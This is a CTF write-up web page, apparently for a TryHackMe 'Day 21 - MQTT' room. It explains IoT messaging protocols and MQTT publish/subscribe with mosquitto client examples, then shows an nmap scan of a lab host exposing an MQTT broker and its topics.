      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../kenobi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Kenobi
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../linuxprivesc/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Linux PrivEsc
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../metasploitexploitation/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Exploitation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../metasploitmeterpreter/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit - Meterpreter
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../motherssecret/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Mother's Secret
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../owaspjuiceshop/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Juice Shop
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../owasptop10_2021/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    OWASP Top 10 - 2021
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../picklerick/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pickle Rick
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../sqlinjection/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../sqlinjectionlab/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SQL Injection Lab
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../ssrf/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSRF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../steelmountain/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Steel Mountain
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../subdomainenumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Subdomain Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../traverse/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Traverse
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../uploadvulnerabilities/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Upload Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../vulnversity/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Vulnversity
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../whattheshell/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    What the Shell?
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#introduction-to-iot" class="md-nav__link">
    <span class="md-ellipsis">
      Introduction to IoT
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#messaging-protocols-and-middleware" class="md-nav__link">
    <span class="md-ellipsis">
      Messaging Protocols and Middleware
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#functionality-of-a-publishsubscribe-model" class="md-nav__link">
    <span class="md-ellipsis">
      Functionality of a Publish/Subscribe Model
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#interacting-with-mqtt" class="md-nav__link">
    <span class="md-ellipsis">
      Interacting with MQTT
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Interacting with MQTT">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#subscribing-to-a-topic" class="md-nav__link">
    <span class="md-ellipsis">
      Subscribing to a Topic
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#publishing-to-a-topic" class="md-nav__link">
    <span class="md-ellipsis">
      Publishing to a Topic
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#ctf-questions" class="md-nav__link">
    <span class="md-ellipsis">
      CTF Questions
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>Day 21 - MQTT</h1>

<h2 id="introduction-to-iot">Introduction to IoT<a class="headerlink" href="#introduction-to-iot" title="Permanent link">&para;</a></h2>
<p>An IoT protocol refers to any protocol used by an IoT device for <code>machine-to-machine</code>, <code>machine-to-gateway</code>, or <code>machine-to-cloud</code> communication. IoT protocols can be characterized into one of two types: <code>IoT data protocol</code> or <code>IoT network protocol</code>.</p>
<p><code>IoT data protocol</code> commonly relies on <code>TCP/IP</code> model. <code>IoT network protocol</code> relies on wireless technology for communication (ie. WiFi, Bluetooth, Zigbee, Z-Wave, etc.).</p>
<h2 id="messaging-protocols-and-middleware">Messaging Protocols and Middleware<a class="headerlink" href="#messaging-protocols-and-middleware" title="Permanent link">&para;</a></h2>
<p>Messaging protocols communicate between two devices through an independent lightweight and efficient middleware server  or by negotiating a communication method amongst themselves. The server is place din between the two clients who want to communicate to translate the communication to a method both devices can understand.</p>
<pre class="mermaid"><code>graph LR;
    A[Client A] --IoT Protocol--&gt;B[Middleware];
    B--IoT Protocol--&gt;A;
    B--HTTP Data--&gt;C[Client B];
    C--HTTP Data--&gt;B;</code></pre>
<p>The table below shows examples of popular protocols used by IoT devices.</p>
<table>
<thead>
<tr>
<th style="text-align: center;">Protocol</th>
<th style="text-align: center;">Communication Method</th>
<th style="text-align: center;">Description</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: center;">MQTT (Message Queuing Telemetry Transport)</td>
<td style="text-align: center;">Middleware</td>
<td style="text-align: center;">A lightweight protocol that relies on a publish/subscribe model to send or receive messages.</td>
</tr>
<tr>
<td style="text-align: center;">CoAP (Constrained Application Protocol)</td>
<td style="text-align: center;">Middleware</td>
<td style="text-align: center;">Translates HTTP communication to a usable communication medium for lightweight devices.</td>
</tr>
<tr>
<td style="text-align: center;">AMQP (Advanced Message Queuing Protocol)</td>
<td style="text-align: center;">Middleware</td>
<td style="text-align: center;">Acts as a transactional protocol to receive, queue, and store messages/payloads between devices.</td>
</tr>
<tr>
<td style="text-align: center;">DDS (Data Distribution Service)</td>
<td style="text-align: center;">Middleware</td>
<td style="text-align: center;">A scalable protocol that relies on a publish/subscribe model to send or receive messages.</td>
</tr>
<tr>
<td style="text-align: center;">HTTP</td>
<td style="text-align: center;">Device-to-Device</td>
<td style="text-align: center;">Used as a communication method from traditional devices to lightweight devices or for large data communication.</td>
</tr>
<tr>
<td style="text-align: center;">WebSocket</td>
<td style="text-align: center;">Device-to-Device</td>
<td style="text-align: center;">Relies on a client-server model to send data over a TCP connection.</td>
</tr>
</tbody>
</table>
<h2 id="functionality-of-a-publishsubscribe-model">Functionality of a Publish/Subscribe Model<a class="headerlink" href="#functionality-of-a-publishsubscribe-model" title="Permanent link">&para;</a></h2>
<p>Message protocols commonly use a <code>publish/subscribe</code> model such as <code>MQTT</code>. This model relies on a broker to negotiate <code>published</code> messages and <code>subscription</code> queries. </p>
<pre class="mermaid"><code>graph LR;
  A[Publisher]--Message from Publisher--&gt;B[Broker];
  B--Message from Publisher--&gt;C[Subscriber];
  C--Message Query--&gt;B;</code></pre>
<p>Based on the above diagram:</p>
<ol>
<li>A publisher sends their message to a broker.</li>
<li>The broker continues relaying the message until a new message is published.</li>
<li>A subscriber can attempt to connect to a broker and receive a message.</li>
</ol>
<p>A broker can store multiple messages from different publishers by using <code>topics</code>. A <code>topic</code> is a semi-arbitrary value pre-negotiated by the publisher and subscriber and sent along with a message. The format of a <code>topic</code> commonly takes the form of <code>&lt;name&gt;/&lt;id&gt;/&lt;function&gt;</code>. When a new message is sent with a given topic, the broker will store/overwrite it under the topic and relay it to the subscribers who have subscribed to it.</p>
<p>The diagram below shows two publishers sending different messages associated with <code>topics</code>.</p>
<pre class="mermaid"><code>graph LR;
    A[Publisher A]--Message: ABCD&lt;br&gt;Topic: A--&gt;B[Broker&lt;br&gt;Topic: A&lt;br&gt;Message: ABCD&lt;br&gt;Topic: B&lt;br&gt;Message: 1234];
    C[Publisher B]--Message: 1234&lt;br&gt;Topic: B--&gt;B;</code></pre>
<p>The diagram below shows two subscribers receiving messages from separate topics of a broker.</p>
<pre class="mermaid"><code>graph LR;
    A[Broker&lt;br&gt;Topic: A&lt;br&gt;Message: ABCD&lt;br&gt;Topic: B&lt;br&gt;Message: 1234]--Message: ABCD--&gt;B[Subscriber A];
    B--Are there messages from topic A?--&gt;A;
    A--Message: 1234--&gt;C[Subscriber B];
    C--Are there messages from topic B?--&gt;A;</code></pre>
<p>Note that this method of communication is <em>asynchronous</em> as the publisher can publish at any time and the subscriber can subscribe to a topic to see if the broker relayed messages.</p>
<h2 id="interacting-with-mqtt">Interacting with MQTT<a class="headerlink" href="#interacting-with-mqtt" title="Permanent link">&para;</a></h2>
<p>Two commonly used libraries for interacting with MQTT are: <code>Paho</code> and <code>Mosquitto</code>.</p>
<p><code>Paho</code> is a python library that offers support for all features of MQTT. <code>Mosquitto</code> is a suite of MQTT utilities that include a broker and publish/subscribe clients which can be used from the command line.</p>
<h3 id="subscribing-to-a-topic">Subscribing to a Topic<a class="headerlink" href="#subscribing-to-a-topic" title="Permanent link">&para;</a></h3>
<p>The <a href="https://mosquitto.org/man/mosquitto_sub-1.html">mosquitto_sub</a> client utility can be used to subscribe to an MQTT broker. By default, the subscription utility will connect a localhost broker and only require a topic to be defined using <code>-t</code> or <code>--topic</code>. Following is an example of connecting to a localhost and subscribing to the topic <em>device/ping</em>: <code>mosquito_sub -t device/ping</code>.</p>
<p>A remote broker can be specified using the <code>-h</code> flag: <code>mosquitto_sub -h example.com -t device/thm</code>.</p>
<h3 id="publishing-to-a-topic">Publishing to a Topic<a class="headerlink" href="#publishing-to-a-topic" title="Permanent link">&para;</a></h3>
<p>The <a href="https://mosquitto.org/man/mosquitto_pub-1.html">mosquitto_pub</a> client utility can be used to publish to an MQTT broker.</p>
<p>To publish a message to a topic, <code>-m</code> or <code>--message</code> flag can be used: <code>mosquitto_pub -h example.com -t device/info -m "This is an example"</code>.</p>
<p>The following are several common optional flags used by both clients:
- <code>-d</code>: Enables debug messages.
- <code>-i</code> or <code>--id</code>: Specifies the id to identify the client to the server.
- <code>-p</code> or <code>--port</code>: Specifies the port the broker is using (Defaults to port 1883).
- <code>-u</code> or <code>--username</code>: Specifies the username for authentication.
- <code>-P</code> or <code>--password</code>: Specifies the password for authentication.
- <code>--url</code>: Specifies username, password, host, port, and topic in one URL.</p>
<h2 id="ctf-questions">CTF Questions<a class="headerlink" href="#ctf-questions" title="Permanent link">&para;</a></h2>
<p>Let's verify that the machine is acting as an MQTT endpoint using Nmap.</p>
<p><div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>$ nmap -sC -sV -p- 10.10.96.87 --min-rate 1500
<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>Starting Nmap 7.93 ( https://nmap.org ) at 2022-12-21 15:31 MST
<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>Verbosity Increased to 1.
<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>Verbosity Increased to 2.
<a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a>Completed Service scan at 15:33, 56.56s elapsed (3 services on 1 host)
<a id="__codelineno-0-6" name="__codelineno-0-6" href="#__codelineno-0-6"></a>NSE: Script scanning 10.10.96.87.
<a id="__codelineno-0-7" name="__codelineno-0-7" href="#__codelineno-0-7"></a>NSE: Starting runlevel 1 (of 3) scan.
<a id="__codelineno-0-8" name="__codelineno-0-8" href="#__codelineno-0-8"></a>Initiating NSE at 15:33
<a id="__codelineno-0-9" name="__codelineno-0-9" href="#__codelineno-0-9"></a>Completed NSE at 15:33, 9.53s elapsed
<a id="__codelineno-0-10" name="__codelineno-0-10" href="#__codelineno-0-10"></a>NSE: Starting runlevel 2 (of 3) scan.
<a id="__codelineno-0-11" name="__codelineno-0-11" href="#__codelineno-0-11"></a>Initiating NSE at 15:33
<a id="__codelineno-0-12" name="__codelineno-0-12" href="#__codelineno-0-12"></a>Completed NSE at 15:33, 0.51s elapsed
<a id="__codelineno-0-13" name="__codelineno-0-13" href="#__codelineno-0-13"></a>NSE: Starting runlevel 3 (of 3) scan.
<a id="__codelineno-0-14" name="__codelineno-0-14" href="#__codelineno-0-14"></a>Initiating NSE at 15:33
<a id="__codelineno-0-15" name="__codelineno-0-15" href="#__codelineno-0-15"></a>Completed NSE at 15:33, 0.01s elapsed
<a id="__codelineno-0-16" name="__codelineno-0-16" href="#__codelineno-0-16"></a>Nmap scan report for 10.10.96.87
<a id="__codelineno-0-17" name="__codelineno-0-17" href="#__codelineno-0-17"></a>Host is up (0.19s latency).
<a id="__codelineno-0-18" name="__codelineno-0-18" href="#__codelineno-0-18"></a>Scanned at 2022-12-21 15:31:34 MST for 125s
<a id="__codelineno-0-19" name="__codelineno-0-19" href="#__codelineno-0-19"></a>Not shown: 65531 closed tcp ports (conn-refused)
<a id="__codelineno-0-20" name="__codelineno-0-20" href="#__codelineno-0-20"></a>PORT      STATE    SERVICE                 VERSION
<a id="__codelineno-0-21" name="__codelineno-0-21" href="#__codelineno-0-21"></a>22/tcp    open     ssh                     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
<a id="__codelineno-0-22" name="__codelineno-0-22" href="#__codelineno-0-22"></a>| ssh-hostkey: 
<a id="__codelineno-0-23" name="__codelineno-0-23" href="#__codelineno-0-23"></a>|   3072 1d8ec8ced4351ab2906a9f2f88248fad (RSA)
<a id="__codelineno-0-24" name="__codelineno-0-24" href="#__codelineno-0-24"></a>| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDIZDobO9iT4Uy6UdlhLCDDB3h7wIg9/DgcDtYRVhluAzWv924ulvlMfVwrsaKCIQ8eJp1jZnbfeIwVOChpWbAM5RPGCnmrZEiJWoKQkgXgDDjOm9+a5oIrvQULpSGXcI5wwmTPNF/8d5R+PJV8xXbY77+X+SwEfLBFcnBtsg307smvEguSFGx64frIKKpof5E8AKRxI5PfNmQtTyIsIE8PBErHr4sB2HXEYwUZc5Hput8NaWn3U8ZjrTPq3ma5Z8Nsrwyw5KoI9nycQ9YD0DX+X5iQBnybz54II3lFhT9WWMS3MgrnfSoyFECCAB+IE5kDwuPreVNCz9slYqG6rsVAQ3lG0fwklxAYvYZEhe27a0t+QRMzMxPoiPq0TDrNYum16/9qywEAK5z4AKiCHKgCQdzEdWNyWu3Z9mOZC3GiokEEZ48ZstvxryNDmoAZ8S3tvuDb3jKStlz3guunfJjMwq8aSzwPNJOGl5IKHQg7S1rDtZD1yuinvQfwEBnD2mM=
<a id="__codelineno-0-25" name="__codelineno-0-25" href="#__codelineno-0-25"></a>|   256 910f21f62ea7e3d42aa5d8d8b712df1a (ECDSA)
<a id="__codelineno-0-26" name="__codelineno-0-26" href="#__codelineno-0-26"></a>| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIe4xxx3L6HrLMkV9lcwOvpvtjrCfCp4vVaFKBp1IyCiSYrlLQhzBoPZvpntZq7fgpFN0mWTwlzegeVZlfQ5mDY=
<a id="__codelineno-0-27" name="__codelineno-0-27" href="#__codelineno-0-27"></a>|   256 40ead4bfe2d14b9d7b5722793f9b88fc (ED25519)
<a id="__codelineno-0-28" name="__codelineno-0-28" href="#__codelineno-0-28"></a>|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKCR97uJNCnjGlaEJg9+yFMl6XvewoQSykPtffjN3PAY
<a id="__codelineno-0-29" name="__codelineno-0-29" href="#__codelineno-0-29"></a>80/tcp    open     http                    WebSockify Python/3.8.10
<a id="__codelineno-0-30" name="__codelineno-0-30" href="#__codelineno-0-30"></a>| fingerprint-strings: 
<a id="__codelineno-0-31" name="__codelineno-0-31" href="#__codelineno-0-31"></a>|   GetRequest: 
<a id="__codelineno-0-32" name="__codelineno-0-32" href="#__codelineno-0-32"></a>|     HTTP/1.1 405 Method Not Allowed
<a id="__codelineno-0-33" name="__codelineno-0-33" href="#__codelineno-0-33"></a>|     Server: WebSockify Python/3.8.10
<a id="__codelineno-0-34" name="__codelineno-0-34" href="#__codelineno-0-34"></a>|     Date: Wed, 21 Dec 2022 22:32:37 GMT
<a id="__codelineno-0-35" name="__codelineno-0-35" href="#__codelineno-0-35"></a>|     Connection: close
<a id="__codelineno-0-36" name="__codelineno-0-36" href="#__codelineno-0-36"></a>|     Content-Type: text/html;charset=utf-8
<a id="__codelineno-0-37" name="__codelineno-0-37" href="#__codelineno-0-37"></a>|     Content-Length: 472
<a id="__codelineno-0-38" name="__codelineno-0-38" href="#__codelineno-0-38"></a>|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;
<a id="__codelineno-0-39" name="__codelineno-0-39" href="#__codelineno-0-39"></a>|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
<a id="__codelineno-0-40" name="__codelineno-0-40" href="#__codelineno-0-40"></a>|     &lt;html&gt;
<a id="__codelineno-0-41" name="__codelineno-0-41" href="#__codelineno-0-41"></a>|     &lt;head&gt;
<a id="__codelineno-0-42" name="__codelineno-0-42" href="#__codelineno-0-42"></a>|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
<a id="__codelineno-0-43" name="__codelineno-0-43" href="#__codelineno-0-43"></a>|     &lt;title&gt;Error response&lt;/title&gt;
<a id="__codelineno-0-44" name="__codelineno-0-44" href="#__codelineno-0-44"></a>|     &lt;/head&gt;
<a id="__codelineno-0-45" name="__codelineno-0-45" href="#__codelineno-0-45"></a>|     &lt;body&gt;
<a id="__codelineno-0-46" name="__codelineno-0-46" href="#__codelineno-0-46"></a>|     &lt;h1&gt;Error response&lt;/h1&gt;
<a id="__codelineno-0-47" name="__codelineno-0-47" href="#__codelineno-0-47"></a>|     &lt;p&gt;Error code: 405&lt;/p&gt;
<a id="__codelineno-0-48" name="__codelineno-0-48" href="#__codelineno-0-48"></a>|     &lt;p&gt;Message: Method Not Allowed.&lt;/p&gt;
<a id="__codelineno-0-49" name="__codelineno-0-49" href="#__codelineno-0-49"></a>|     &lt;p&gt;Error code explanation: 405 - Specified method is invalid for this resource.&lt;/p&gt;
<a id="__codelineno-0-50" name="__codelineno-0-50" href="#__codelineno-0-50"></a>|     &lt;/body&gt;
<a id="__codelineno-0-51" name="__codelineno-0-51" href="#__codelineno-0-51"></a>|     &lt;/html&gt;
<a id="__codelineno-0-52" name="__codelineno-0-52" href="#__codelineno-0-52"></a>|   HTTPOptions: 
<a id="__codelineno-0-53" name="__codelineno-0-53" href="#__codelineno-0-53"></a>|     HTTP/1.1 501 Unsupported method (&#39;OPTIONS&#39;)
<a id="__codelineno-0-54" name="__codelineno-0-54" href="#__codelineno-0-54"></a>|     Server: WebSockify Python/3.8.10
<a id="__codelineno-0-55" name="__codelineno-0-55" href="#__codelineno-0-55"></a>|     Date: Wed, 21 Dec 2022 22:32:38 GMT
<a id="__codelineno-0-56" name="__codelineno-0-56" href="#__codelineno-0-56"></a>|     Connection: close
<a id="__codelineno-0-57" name="__codelineno-0-57" href="#__codelineno-0-57"></a>|     Content-Type: text/html;charset=utf-8
<a id="__codelineno-0-58" name="__codelineno-0-58" href="#__codelineno-0-58"></a>|     Content-Length: 500
<a id="__codelineno-0-59" name="__codelineno-0-59" href="#__codelineno-0-59"></a>|     &lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01//EN&quot;
<a id="__codelineno-0-60" name="__codelineno-0-60" href="#__codelineno-0-60"></a>|     &quot;http://www.w3.org/TR/html4/strict.dtd&quot;&gt;
<a id="__codelineno-0-61" name="__codelineno-0-61" href="#__codelineno-0-61"></a>|     &lt;html&gt;
<a id="__codelineno-0-62" name="__codelineno-0-62" href="#__codelineno-0-62"></a>|     &lt;head&gt;
<a id="__codelineno-0-63" name="__codelineno-0-63" href="#__codelineno-0-63"></a>|     &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
<a id="__codelineno-0-64" name="__codelineno-0-64" href="#__codelineno-0-64"></a>|     &lt;title&gt;Error response&lt;/title&gt;
<a id="__codelineno-0-65" name="__codelineno-0-65" href="#__codelineno-0-65"></a>|     &lt;/head&gt;
<a id="__codelineno-0-66" name="__codelineno-0-66" href="#__codelineno-0-66"></a>|     &lt;body&gt;
<a id="__codelineno-0-67" name="__codelineno-0-67" href="#__codelineno-0-67"></a>|     &lt;h1&gt;Error response&lt;/h1&gt;
<a id="__codelineno-0-68" name="__codelineno-0-68" href="#__codelineno-0-68"></a>|     &lt;p&gt;Error code: 501&lt;/p&gt;
<a id="__codelineno-0-69" name="__codelineno-0-69" href="#__codelineno-0-69"></a>|     &lt;p&gt;Message: Unsupported method (&#39;OPTIONS&#39;).&lt;/p&gt;
<a id="__codelineno-0-70" name="__codelineno-0-70" href="#__codelineno-0-70"></a>|     &lt;p&gt;Error code explanation: HTTPStatus.NOT_IMPLEMENTED - Server does not support this operation.&lt;/p&gt;
<a id="__codelineno-0-71" name="__codelineno-0-71" href="#__codelineno-0-71"></a>|     &lt;/body&gt;
<a id="__codelineno-0-72" name="__codelineno-0-72" href="#__codelineno-0-72"></a>|_    &lt;/html&gt;
<a id="__codelineno-0-73" name="__codelineno-0-73" href="#__codelineno-0-73"></a>|_http-title: Error response
<a id="__codelineno-0-74" name="__codelineno-0-74" href="#__codelineno-0-74"></a>|_http-server-header: WebSockify Python/3.8.10
<a id="__codelineno-0-75" name="__codelineno-0-75" href="#__codelineno-0-75"></a>1883/tcp  open     mosquitto version 1.6.9
<a id="__codelineno-0-76" name="__codelineno-0-76" href="#__codelineno-0-76"></a>| mqtt-subscribe: 
<a id="__codelineno-0-77" name="__codelineno-0-77" href="#__codelineno-0-77"></a>|   Topics and their most recent payloads: 
<a id="__codelineno-0-78" name="__codelineno-0-78" href="#__codelineno-0-78"></a>|     $SYS/broker/uptime: 1122 seconds
<a id="__codelineno-0-79" name="__codelineno-0-79" href="#__codelineno-0-79"></a>|     $SYS/broker/load/bytes/sent/5min: 535.67
<a id="__codelineno-0-80" name="__codelineno-0-80" href="#__codelineno-0-80"></a>|     $SYS/broker/publish/bytes/sent: 2408
<a id="__codelineno-0-81" name="__codelineno-0-81" href="#__codelineno-0-81"></a>|     $SYS/broker/clients/active: 5
<a id="__codelineno-0-82" name="__codelineno-0-82" href="#__codelineno-0-82"></a>|     $SYS/broker/publish/messages/received: 111
<a id="__codelineno-0-83" name="__codelineno-0-83" href="#__codelineno-0-83"></a>|     $SYS/broker/load/publish/received/1min: 5.66
<a id="__codelineno-0-84" name="__codelineno-0-84" href="#__codelineno-0-84"></a>|     $SYS/broker/messages/sent: 214
<a id="__codelineno-0-85" name="__codelineno-0-85" href="#__codelineno-0-85"></a>|     $SYS/broker/clients/inactive: 0
<a id="__codelineno-0-86" name="__codelineno-0-86" href="#__codelineno-0-86"></a>|     $SYS/broker/clients/connected: 5
<a id="__codelineno-0-87" name="__codelineno-0-87" href="#__codelineno-0-87"></a>|     $SYS/broker/store/messages/count: 43
<a id="__codelineno-0-88" name="__codelineno-0-88" href="#__codelineno-0-88"></a>|     $SYS/broker/publish/messages/sent: 152
<a id="__codelineno-0-89" name="__codelineno-0-89" href="#__codelineno-0-89"></a>|     $SYS/broker/clients/disconnected: 0
<a id="__codelineno-0-90" name="__codelineno-0-90" href="#__codelineno-0-90"></a>|     $SYS/broker/messages/received: 173
<a id="__codelineno-0-91" name="__codelineno-0-91" href="#__codelineno-0-91"></a>|     $SYS/broker/load/connections/1min: 1.35
<a id="__codelineno-0-92" name="__codelineno-0-92" href="#__codelineno-0-92"></a>|     $SYS/broker/load/messages/received/1min: 11.07
<a id="__codelineno-0-93" name="__codelineno-0-93" href="#__codelineno-0-93"></a>|     $SYS/broker/heap/current: 58504
<a id="__codelineno-0-94" name="__codelineno-0-94" href="#__codelineno-0-94"></a>|     $SYS/broker/version: mosquitto version 1.6.9
<a id="__codelineno-0-95" name="__codelineno-0-95" href="#__codelineno-0-95"></a>|     $SYS/broker/load/publish/sent/1min: 43.12
<a id="__codelineno-0-96" name="__codelineno-0-96" href="#__codelineno-0-96"></a>|     $SYS/broker/bytes/received: 4167
<a id="__codelineno-0-97" name="__codelineno-0-97" href="#__codelineno-0-97"></a>|     $SYS/broker/load/messages/received/15min: 6.63
<a id="__codelineno-0-98" name="__codelineno-0-98" href="#__codelineno-0-98"></a>|     $SYS/broker/load/bytes/received/1min: 259.01
<a id="__codelineno-0-99" name="__codelineno-0-99" href="#__codelineno-0-99"></a>|     $SYS/broker/subscriptions/count: 4
<a id="__codelineno-0-100" name="__codelineno-0-100" href="#__codelineno-0-100"></a>|     $SYS/broker/load/sockets/5min: 0.53
<a id="__codelineno-0-101" name="__codelineno-0-101" href="#__codelineno-0-101"></a>|     $SYS/broker/messages/stored: 43
<a id="__codelineno-0-102" name="__codelineno-0-102" href="#__codelineno-0-102"></a>|     $SYS/broker/store/messages/bytes: 200
<a id="__codelineno-0-103" name="__codelineno-0-103" href="#__codelineno-0-103"></a>|     $SYS/broker/retained messages/count: 46
<a id="__codelineno-0-104" name="__codelineno-0-104" href="#__codelineno-0-104"></a>|     $SYS/broker/bytes/sent: 5685
<a id="__codelineno-0-105" name="__codelineno-0-105" href="#__codelineno-0-105"></a>|     $SYS/broker/load/connections/5min: 0.38
<a id="__codelineno-0-106" name="__codelineno-0-106" href="#__codelineno-0-106"></a>|     device/init: S2INBJXRDQFDF90VNXU6
<a id="__codelineno-0-107" name="__codelineno-0-107" href="#__codelineno-0-107"></a>|     $SYS/broker/load/publish/sent/15min: 6.95
<a id="__codelineno-0-108" name="__codelineno-0-108" href="#__codelineno-0-108"></a>|     $SYS/broker/load/sockets/1min: 1.58
<a id="__codelineno-0-109" name="__codelineno-0-109" href="#__codelineno-0-109"></a>|     $SYS/broker/load/sockets/15min: 0.25
<a id="__codelineno-0-110" name="__codelineno-0-110" href="#__codelineno-0-110"></a>|     $SYS/broker/load/publish/sent/5min: 13.82
<a id="__codelineno-0-111" name="__codelineno-0-111" href="#__codelineno-0-111"></a>|     $SYS/broker/clients/total: 4
<a id="__codelineno-0-112" name="__codelineno-0-112" href="#__codelineno-0-112"></a>|     $SYS/broker/load/bytes/sent/1min: 1728.47
<a id="__codelineno-0-113" name="__codelineno-0-113" href="#__codelineno-0-113"></a>|     $SYS/broker/load/bytes/received/5min: 221.28
<a id="__codelineno-0-114" name="__codelineno-0-114" href="#__codelineno-0-114"></a>|     $SYS/broker/load/bytes/sent/15min: 263.32
<a id="__codelineno-0-115" name="__codelineno-0-115" href="#__codelineno-0-115"></a>|     $SYS/broker/load/messages/sent/15min: 9.34
<a id="__codelineno-0-116" name="__codelineno-0-116" href="#__codelineno-0-116"></a>|     $SYS/broker/heap/maximum: 58904
<a id="__codelineno-0-117" name="__codelineno-0-117" href="#__codelineno-0-117"></a>|     $SYS/broker/load/publish/received/5min: 5.76
<a id="__codelineno-0-118" name="__codelineno-0-118" href="#__codelineno-0-118"></a>|     $SYS/broker/load/messages/sent/5min: 17.36
<a id="__codelineno-0-119" name="__codelineno-0-119" href="#__codelineno-0-119"></a>|     $SYS/broker/load/publish/received/15min: 4.23
<a id="__codelineno-0-120" name="__codelineno-0-120" href="#__codelineno-0-120"></a>|     $SYS/broker/load/messages/sent/1min: 48.54
<a id="__codelineno-0-121" name="__codelineno-0-121" href="#__codelineno-0-121"></a>|     $SYS/broker/clients/maximum: 4
<a id="__codelineno-0-122" name="__codelineno-0-122" href="#__codelineno-0-122"></a>|     $SYS/broker/load/messages/received/5min: 9.30
<a id="__codelineno-0-123" name="__codelineno-0-123" href="#__codelineno-0-123"></a>|     $SYS/broker/publish/bytes/received: 2220
<a id="__codelineno-0-124" name="__codelineno-0-124" href="#__codelineno-0-124"></a>|     $SYS/broker/load/connections/15min: 0.19
<a id="__codelineno-0-125" name="__codelineno-0-125" href="#__codelineno-0-125"></a>|_    $SYS/broker/load/bytes/received/15min: 158.81
